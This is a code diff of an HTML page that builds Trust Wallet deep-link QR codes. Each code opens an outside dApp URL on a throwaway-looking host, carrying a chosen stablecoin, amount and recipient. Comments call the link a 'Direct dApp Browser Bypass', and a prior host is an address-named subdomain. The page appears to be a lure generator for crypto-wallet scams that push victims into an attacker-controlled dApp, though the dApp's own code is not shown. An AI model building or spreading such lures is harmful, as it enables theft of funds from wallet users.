@@ -10,7 +10,6 @@
     * {
       box-sizing: border-box;
     }
-    /* //fuck u */
     body {
       margin: 0;
       padding: 20px;
@@ -62,12 +61,6 @@
       border-color: #3b82f6;
     }
 
-    .value {
-      font-family: monospace;
-      word-break: break-all;
-      line-height: 1.5;
-    }
-
     #qrcode {
       display: flex;
       justify-content: center;
@@ -94,10 +87,6 @@
     button:hover {
       opacity: 0.9;
     }
-
-    .success {
-      color: #4ade80;
-    }
   </style>
 </head>
 
@@ -107,255 +96,109 @@
 
   <h1>Trust Wallet DApp QR</h1>
 
-
   <!-- COIN -->
-
   <div class="box">
-
-    <div class="label">
-      Coin
-    </div>
-
+    <div class="label">Coin</div>
     <select id="coin">
-
-      <option value="" selected disabled>
-        Select Coin
-      </option>
-
-      <option value="usdterc20">
-        USDT ERC20
-      </option>
-
-      <option value="usdcerc20">
-        USDC ERC20
-      </option>
-
-      <option value="usdtbep20">
-        USDT BEP20
-      </option>
-
-      <option value="usdttrc20">
-        USDT TRC20
-      </option>
-
+      <option value="" selected disabled>Select Coin</option>
+      <option value="usdterc20">USDT ERC20</option>
+      <option value="usdcerc20">USDC ERC20</option>
+      <option value="usdtbep20">USDT BEP20</option>
+      <option value="usdttrc20">USDT TRC20</option>
     </select>
-
   </div>
-
 
   <!-- AMOUNT -->
-
   <div class="box">
-
-    <div class="label">
-      Amount
-    </div>
-
-    <input
-      id="amount"
-      type="text"
-      placeholder="Enter amount"
-    >
-
+    <div class="label">Amount</div>
+    <input id="amount" type="text" placeholder="Enter amount">
   </div>
-
 
   <!-- RECIPIENT -->
-
   <div class="box">
-
-    <div class="label">
-      Recipient
-    </div>
-
-    <input
-      id="recipient"
-      type="text"
-      placeholder="0x..."
-    >
-
+    <div class="label">Recipient</div>
+    <input id="recipient" type="text" placeholder="0x... or T...">
   </div>
-
 
   <!-- GENERATE -->
-
-  <button onclick="generateQR()">
-    Generate QR
-  </button>
-
-
-  <!-- DAPP URL -->
-
-
-
+  <button onclick="generateQR()">Generate QR</button>
 
   <!-- TRUST DEEPLINK -->
-
   <div class="box">
-
-    <div class="label">
-      Trust Wallet Deep Link
-    </div>
-
- 
+    <div class="label">Trust Wallet Deep Link</div>
   </div>
 
-
   <!-- QR -->
-
   <div id="qrcode">
     QR will appear here
   </div>
 
-
-  <!-- OPEN TRUST -->
-
- 
-
-  <!-- STATUS -->
-
-
 </div>
-
 
 <script src="https://cdn.jsdelivr.net/npm/kjua@0.1.1/dist/kjua.min.js"></script>
 
 <script>
-
-// const baseDappURL =
-//   "https://0xbd110dc07d0322b96b4500af82d63f5db68cc105.becuss.com/";
-
-const baseDappURL =
-  "https://qr-scanner-iphone.pages.dev";
-
+const baseDappURL = "https://qr-scanner-iphone.pages.dev";
 let trustDeepLink = "";
-
 
 /* =========================
    GENERATE QR
 ========================= */
-
 function generateQR() {
-
-  const coin =
-    document.getElementById("coin").value;
-
-  const amount =
-    document.getElementById("amount").value.trim();
-
-  const recipient =
-    document.getElementById("recipient").value.trim();
-
-
-  /* Validate */
+  const coin = document.getElementById("coin").value;
+  const amount = document.getElementById("amount").value.trim();
+  const recipient = document.getElementById("recipient").value.trim();
 
   if (!coin) {
     alert("Please select a coin.");
     return;
   }
-
   if (!amount) {
     alert("Please enter an amount.");
     return;
   }
-
   if (!recipient) {
     alert("Please enter a recipient address.");
     return;
   }
 
-
-  /* =========================
-     BUILD DAPP URL
-  ========================= */
-
+  /* BUILD DAPP URL */
   const dappURL =
     baseDappURL +
     "?coin=" + encodeURIComponent(coin) +
     "&amount=" + encodeURIComponent(amount) +
     "&recipient=" + encodeURIComponent(recipient);
 
-
-  /* =========================
-     BUILD TRUST DEEPLINK
-  ========================= */
-
-  // TRON (TRC20) = coin_id 195, EVM Tokens = coin_id 60
-  const coinId = (coin === "usdttrc20") ? "195" : "60";
-
+  /* BUILD TRUST DEEPLINK (Direct dApp Browser Bypass) */
   trustDeepLink =
     "https://link.trustwallet.com/open_url" +
-    "?coin_id=" + coinId +
-    "&url=" + encodeURIComponent(dappURL);
+    "?url=" + encodeURIComponent(dappURL);
 
-
-  /* =========================
-     DISPLAY URLS
-  ========================= */
-
-
-
-
-
-  /* =========================
-     REMOVE OLD QR
-  ========================= */
-
-  const qrContainer =
-    document.getElementById("qrcode");
-
+  /* REMOVE OLD QR */
+  const qrContainer = document.getElementById("qrcode");
   qrContainer.innerHTML = "";
 
-
-  /* =========================
-     GENERATE QR
-  ========================= */
-
+  /* GENERATE QR */
   const qr = kjua({
-
     text: trustDeepLink,
-
     size: 280,
-
     fill: "#000000",
-
     back: "#ffffff",
-
     rounded: 0,
-
     quiet: 2,
-
     mode: "plain"
-
   });
 
-
   qrContainer.appendChild(qr);
-
 }
-
-
-/* =========================
-   OPEN TRUST WALLET
-========================= */
 
 function openTrust() {
-
   if (!trustDeepLink) {
-
     generateQR();
-
-    if (!trustDeepLink) {
-      return;
-    }
-
+    if (!trustDeepLink) return;
   }
-
-  window.location.href =
-    trustDeepLink;
-
+  window.location.href = trustDeepLink;
 }
-
 </script>
 
 </body>
